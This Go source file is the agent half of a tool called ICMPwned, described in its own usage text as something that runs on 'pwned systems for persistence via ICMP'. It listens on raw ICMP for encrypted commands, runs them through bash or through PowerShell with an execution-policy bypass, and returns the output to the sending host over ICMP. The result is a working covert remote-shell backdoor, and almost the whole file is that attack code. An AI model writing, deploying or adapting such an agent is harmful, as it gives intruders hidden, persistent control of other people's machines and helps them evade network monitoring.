package main

import (
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"

	"github.com/s-christian/icmpwned/lib/logger"
	"github.com/s-christian/icmpwned/lib/system"
	"github.com/s-christian/icmpwned/lib/utils"

	"github.com/urfave/cli/v2"
	"golang.org/x/net/ipv4"
)

const (
	maxArgs = 0
)

var (
	listenAddress net.IP = system.GetHostIP()
)

func main() {
	app := &cli.App{
		Name:        "ICMPwned Agent",
		Usage:       "Run on pwned systems for persistence via ICMP.",
		Description: "Executes commands received from the ICMPwned Server application.",
		Flags: []cli.Flag{
			&cli.BoolFlag{
				Name:    "daemonize",
				Aliases: []string{"d"},
				Value:   false,
				Usage:   "daemonize instead of running in the foreground",
			},
		},
		Action: agent,
	}

	err := app.Run(os.Args)
	if err != nil {
		logger.LogError(err)
		os.Exit(logger.ERR_UNKNOWN)
	}
}

func agent(c *cli.Context) error {
	if c.NArg() > maxArgs {
		logger.Log(logger.Error, "Too many arguments provided!", strconv.Itoa(c.NArg()), ">", strconv.Itoa(maxArgs))
		os.Exit(logger.ERR_USAGE)
	}

	if c.Bool("daemonize") {
		agentDaemonize()
	} else {
		agentForeground()
	}

	return nil
}

func agentForeground() {
	logger.Log(logger.Info, "Listener started, waiting for commands from server")

	// Start listener
	conn, err := utils.ListenICMP(listenAddress.String())
	if err != nil {
		logger.Log(logger.Error, "Could not start raw ICMP listener")
		logger.LogError(err)
		os.Exit(logger.ERR_CONNECTION)
	}

	for {
		// Get command from ICMP connection - waiting indefinitely until one arrives
		rawCommand, icmpType, srcAddr, err := utils.GetICMPData(conn)
		if err != nil {
			logger.Log(logger.Error, "Could not get command from server")
			logger.LogError(err)
			continue
		}

		// Don't process unexpected ICMP Echo Replies
		// To fix a Windows issue, don't capture replies that originate from your own system.
		if icmpType == ipv4.ICMPTypeEchoReply { //&& srcAddr.String() != listenAddress.String() {
			logger.Log(logger.Debug, "Caught unexpected Echo Reply from", srcAddr.String())
			continue
		}

		decryptedCommand, err := utils.DecryptContent(rawCommand)
		if err != nil {
			logger.LogError(err)
			continue
		}
		decryptedCommandString := string(decryptedCommand)

		logger.Log(logger.List, "Received command from", srcAddr.String(), "=>", decryptedCommandString)

		// Execute command
		var commandOutput []byte
		if runtime.GOOS == "windows" {
			commandOutput, err = exec.Command("powershell.exe", "-noP", "-Ep", "byPASS", "-c", decryptedCommandString).CombinedOutput()
		} else {
			commandOutput, err = exec.Command("bash", "-c", decryptedCommandString).CombinedOutput()
		}
		if err != nil {
			logger.Log(logger.Error, "Could not execute command:", decryptedCommandString)
			logger.LogError(err)
		}

		logger.Log(logger.Debug, "Command output:\n"+string(commandOutput))

		// Send back command output
		_, err = utils.SendICMPData(conn, srcAddr, commandOutput)
		if err != nil {
			logger.Log(logger.Error, "Could not send command output")
			logger.LogError(err)
			continue
		}

		// Receive Echo Reply from Server to confirm receipt of command output
		err = utils.ICMPDataReceived(conn, srcAddr.(*net.IPAddr).IP, commandOutput)
		if err != nil {
			logger.Log(logger.Warning, "Server did not confirm receipt of command output")
			logger.LogError(err)
			continue
		}
		logger.Log(logger.Done, "Server confirmed receipt of command output")
	}
}

func agentDaemonize() {
	logger.Log(logger.Debug, "Running as daemon")

	/*
		for {
			// Start listener
			conn, err := utils.ListenICMP(listenAddress.String())
			if err != nil {
				logger.Log(logger.Error, "Could not start raw ICMP listener") // couldn't start listener, notify and exit before daemonizing
				logger.LogError(err)
				os.Exit(logger.ERR_CONNECTION)
			}

			// Get message from ICMP connection - waiting indefinitely until one arrives
			rawCommand, icmpType, srcAddr, magic, err := utils.ParseICMPConnection(conn)
			if err != nil {
				continue
			}

			if !magic {
				continue
			}

			icmpTypeString := ipv4.ICMPType(icmpType.Protocol()).String()
			msg := string(rawCommand)
			logger.Log(logger.List, "Received ICMP", icmpTypeString, "message from", srcAddr.String(), "=>", msg)
		}
	*/
}
